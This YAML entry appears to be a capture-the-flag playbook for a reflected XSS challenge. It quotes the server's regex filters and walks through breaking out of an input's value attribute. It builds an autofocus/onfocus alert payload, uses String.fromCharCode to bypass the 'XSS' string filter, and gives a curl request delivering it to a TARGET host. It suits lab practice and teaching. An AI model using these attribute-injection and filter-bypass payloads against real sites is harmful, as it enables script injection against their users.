name: attribute_xss_string_bypass_cross11
category: web
tags: [xss, injection, attribute_injection, string_bypass, fromCharCode]
indicators:
  - "Input injected into HTML attribute: value=\"{input}\""
  - "Regex filters \"XSS\" and 'XSS' strings"
  - "Regex filters HTML tags <[a-z/]"
  - "Need to trigger alert('XSS')"
  - "PhantomJS validates XSS and triggers focus event"

tricks:
  - name: "Step 1: Identify injection point"
    when: "Analyze source code"
    how: "User input inserted into input tag value attribute"
    payload: |
      <input type=text name=name value="{msg}">

  - name: "Step 2: Analyze filter rules"
    when: "Regular XSS fails"
    how: "Two filters applied"
    payload: |
      1. re.sub(r"""["']XSS["']""", "", msg) - removes quoted XSS
      2. re.sub(r"""<[a-z/]""", "", msg) - removes HTML tags

  - name: "Step 3: Close attribute and inject event"
    when: "Need to execute JavaScript"
    how: "Close value attribute with quote, add event handler"
    payload: |
      " onfocus=alert(1) x="

  - name: "Step 4: Bypass XSS string filter"
    when: "alert('XSS') is filtered"
    how: "Use String.fromCharCode to construct XSS (X=88, S=83)"
    payload: |
      alert(String.fromCharCode(88,83,83))

  - name: "Step 5: Use autofocus to trigger"
    when: "Need automatic trigger"
    how: "PhantomJS triggers elements with autofocus/onfocus"
    payload: |
      " autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="

  - name: "Step 6: Submit payload"
    when: "Execute attack"
    how: "GET request to /page with name parameter"
    payload: |
      curl "http://TARGET/page?name=%22%20autofocus%20onfocus=alert(String.fromCharCode(88,83,83))%20x=%22"
